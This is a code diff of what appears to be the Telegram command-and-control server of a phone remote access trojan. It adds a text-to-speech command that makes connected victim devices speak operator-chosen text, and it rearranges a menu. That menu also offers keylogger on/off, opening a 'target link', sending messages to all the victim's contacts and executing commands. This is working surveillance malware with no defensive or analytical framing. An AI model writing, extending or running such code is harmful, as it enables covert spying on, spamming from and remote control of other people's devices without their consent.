@@ -226,7 +226,27 @@ appBot.on('message', (message) => {
                 }
             )
         }
-
+        if (message.reply_to_message.text.includes('°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙏𝙚𝙭𝙩 𝙩𝙤 𝙎𝙥𝙚𝙖𝙠')) {
+            const message_to_tts = message.text
+            const message_tts_link = 'https://translate.google.com/translate_tts?ie=UTF-8&tl=en&tk=995126.592330&client=t&q=' + encodeURIComponent(message_to_tts)
+            appSocket.clients.forEach(function each(ws) {
+                if (ws.uuid == currentUuid) {
+                    ws.send(`text_to_speech:${message_tts_link}`)
+                }
+            });
+            currentUuid = ''
+            appBot.sendMessage(id,
+                '°• 𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨\n\n' +
+                '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘᴏɴꜱᴇ ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+                {
+                    parse_mode: "HTML",
+                    "reply_markup": {
+                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                        'resize_keyboard': true
+                    }
+                }
+            )
+        }
 
 
 
@@ -528,16 +548,15 @@ appBot.on("callback_query", (callbackQuery) => {
                         {text: '𝙆𝙚𝙮𝙇𝙤𝙜𝙜𝙚𝙧 𝙊𝙛𝙛', callback_data: `keylogger_off:${uuid}`},
                     ],
                     [
-                        {
-                            text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨',
-                            callback_data: `send_message_to_all:${uuid}`
-                        },
-                        {
-                            text: '𝙊𝙥𝙚𝙣 𝙏𝙖𝙧𝙜𝙚𝙩 𝙇𝙞𝙣𝙠',
-                            callback_data: `open_target_link:${uuid}`
-
-                        },
+                        {text: '𝙊𝙥𝙚𝙣 𝙏𝙖𝙧𝙜𝙚𝙩 𝙇𝙞𝙣𝙠', callback_data: `open_target_link:${uuid}`},
+                        {text: '𝙏𝙚𝙭𝙩 𝙏𝙤 𝙎𝙥𝙚𝙚𝙘𝙝', callback_data: `text_to_speech:${uuid}`},
                     ],
+                    [
+                      {
+                          text: '𝙎𝙚𝙣𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨',
+                          callback_data: `send_message_to_all:${uuid}`
+                      }
+                    ]
                 ]
             },
             parse_mode: "HTML"
@@ -773,8 +792,17 @@ appBot.on("callback_query", (callbackQuery) => {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
             '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙\n\n' +
-            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛʜᴀᴛ ᴛʜᴇ ᴍᴇꜱꜱᴀɢᴇ ᴡɪʟʟ ɴᴏᴛ ʙᴇ ꜱᴇɴᴛ ɪꜰ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏꜰ ᴄʜᴀʀᴀᴄᴛᴇʀꜱ ɪɴ ʏᴏᴜʀ ᴍᴇꜱꜱᴀɢᴇ ɪꜱ ᴍᴏʀᴇ ᴛʜᴀɴ ᴀʟʟᴏᴡᴇᴅ',
+            '• ʙᴇ ᴄᴀʀᴇꜰᴜʟ ᴛᴏ sᴇɴᴅ ʟɪɴᴋs ᴀʟᴏɴᴇ ᴡɪᴛʜᴏᴜᴛ ᴀɴʏ ᴛᴇxᴛ',
             {reply_markup: {force_reply: true}}
+        )
+        currentUuid = uuid
+    }
+    if (commend == 'text_to_speech') {
+        appBot.deleteMessage(id, msg.message_id)
+        appBot.sendMessage(id,
+            '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙏𝙚𝙭𝙩 𝙩𝙤 𝙎𝙥𝙚𝙖𝙠\n\n' +
+            '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛᴇxᴛ ᴛʜᴀᴛ ʜᴀs ᴛᴏ ʙᴇ sᴘᴏᴋᴇɴ ᴏɴ ᴛʜᴇ ᴅᴇᴠɪᴄᴇ. ᴀɴʏ ʟᴀɴɢᴜᴀɢᴇ ᴀᴄᴄᴇᴘᴛɪʙʟᴇ.',
+            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
         currentUuid = uuid
     }
